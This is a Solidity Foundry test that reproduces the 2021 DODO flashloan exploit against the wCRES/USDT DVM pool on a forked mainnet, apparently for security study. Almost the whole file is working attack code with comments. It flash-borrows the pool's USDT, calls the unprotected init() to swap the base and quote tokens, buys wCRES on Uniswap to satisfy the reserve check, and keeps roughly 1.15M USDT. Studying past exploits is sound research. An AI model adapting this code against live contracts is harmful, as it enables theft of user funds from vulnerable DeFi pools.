// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

// DODO Flashloan Exploit (March 2021)
// Vulnerability: DVM.init() is callable by anyone without access control.
//
// Attack flow:
// 1. Flash borrow all USDT from the wCRES/USDT DVM pool (base=wCRES, quote=USDT)
// 2. In callback: call init() to swap base<->quote (base=USDT, quote=wCRES)
//    - Now _BASE_TOKEN_=USDT, _QUOTE_TOKEN_=wCRES (reserves unchanged)
// 3. Buy a tiny amount of wCRES from Uniswap using a fraction of borrowed USDT
// 4. Transfer that wCRES to the DVM so quoteBalance += wCRES_bought
//    - Now quoteBalance >= _BASE_RESERVE_ + _QUOTE_RESERVE_ → AMM check passes
// 5. Keep remaining USDT as profit (~1.15M USDT - tiny Uniswap cost)

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract ContractTest is Test {
    DVM     dvm        = DVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);
    IERC20  wCRES      = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);
    USDT    usdt       = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // Uniswap V2 router for buying wCRES with USDT
    IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address maintainer     = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
    uint256 lpFeeRate      = 3_000_000_000_000_000;

    address mywallet;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 12_000_000);
        mywallet = msg.sender;
    }

    function testExploit() public {
        uint256 usdtBefore  = usdt.balanceOf(mywallet);
        uint256 wCRESBefore = wCRES.balanceOf(mywallet);

        emit log_named_uint("[*] DVM wCRES balance", wCRES.balanceOf(address(dvm)));
        emit log_named_uint("[*] DVM USDT balance",  usdt.balanceOf(address(dvm)));

        // Borrow ALL USDT from the DVM (baseAmount=0 so wCRES stays in pool)
        uint256 usdtToBorrow = usdt.balanceOf(address(dvm));
        dvm.flashLoan(0, usdtToBorrow, address(this), "x");

        uint256 usdtProfit  = usdt.balanceOf(mywallet) - usdtBefore;
        uint256 wCRESProfit = wCRES.balanceOf(mywallet) > wCRESBefore ? wCRES.balanceOf(mywallet) - wCRESBefore : 0;
        emit log_named_uint("[*] USDT profit",  usdtProfit);
        emit log_named_uint("[*] wCRES profit", wCRESProfit);

        assertGt(usdtProfit, 0, "no USDT profit - exploit failed");
    }

    function DVMFlashLoanCall(
        address /*sender*/,
        uint256 /*baseAmount*/,
        uint256 quoteAmount,
        bytes calldata /*data*/
    ) external {
        emit log_named_uint("[cb] USDT borrowed", quoteAmount);

        // Step 1: Re-init pool to swap base=USDT, quote=wCRES
        // After init: _BASE_TOKEN_=USDT, _QUOTE_TOKEN_=wCRES, reserves unchanged
        // _BASE_RESERVE_ = old wCRES reserve (134897917762348532103754)
        // _QUOTE_RESERVE_ = old USDT reserve (1150965863028)
        // _I_ stays 1, _K_ stays 1e18 (already those values)
        dvm.init(
            maintainer,
            address(usdt),    // new base  = USDT
            address(wCRES),   // new quote = wCRES
            0,                // lpFeeRate = 0 (no fee, so receiveBaseAmount = quoteInput exactly)
            mtFeeRateModel,
            1,                // i = 1
            0,                // k = 0 (pure constant price → receiveBaseAmount = quoteInput)
            false
        );

        // After init, the flashLoan check computes:
        //   baseBalance  = USDT.balanceOf(dvm) = 0         (all borrowed)
        //   quoteBalance = wCRES.balanceOf(dvm) = wCRES_reserve  (untouched)
        //   _QUOTE_RESERVE_ = old_USDT = 1150965863028
        //   quoteInput = quoteBalance - _QUOTE_RESERVE_ = wCRES_reserve - old_USDT
        //   receiveBaseAmount = quoteInput (with i=1, k=0, constant price)
        //   deficit = _BASE_RESERVE_ - baseBalance = wCRES_reserve
        //   → receiveBaseAmount (wCRES_reserve - old_USDT) < deficit (wCRES_reserve)  ← FAILS by old_USDT

        // Step 2: Buy a tiny amount of wCRES on Uniswap and deposit to DVM
        // This increases quoteBalance by wCRES_bought
        // We need: wCRES_bought >= _QUOTE_RESERVE_ = 1150965863028 (in wCRES units = 1.15e12)
        // Price of wCRES ≈ 8.52e-9 USDT each (in 6 decimal units)
        // Cost = 1150965863028 wCRES * 8.52e-9 USDT/wCRES ≈ $0.01 (negligible)
        // We use 10000 USDT (10_000_000_000 in 6 decimals) to buy wCRES for safety margin

        uint256 usdtForSwap = 10_000_000_000; // 10000 USDT (6 decimals)
        // Approve router
        usdt.approve(address(router), usdtForSwap);

        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(wCRES);

        // Swap USDT for wCRES, output goes to DVM contract directly
        router.swapExactTokensForTokens(
            usdtForSwap,
            1,                    // min wCRES out (accept any)
            path,
            address(dvm),         // wCRES goes directly to DVM
            block.timestamp + 100
        );

        emit log_named_uint("[cb] wCRES now in DVM", wCRES.balanceOf(address(dvm)));
        emit log_named_uint("[cb] USDT remaining in this contract", usdt.balanceOf(address(this)));

        // Step 3: Keep remaining USDT (the flashloan check now succeeds because
        // quoteBalance = old_wCRES + wCRES_bought >= _BASE_RESERVE_ + _QUOTE_RESERVE_)
        uint256 usdtBal = usdt.balanceOf(address(this));
        if (usdtBal > 0) {
            usdt.transfer(mywallet, usdtBal);
        }
        emit log_named_uint("[cb] USDT sent to mywallet", usdt.balanceOf(mywallet));
    }
}
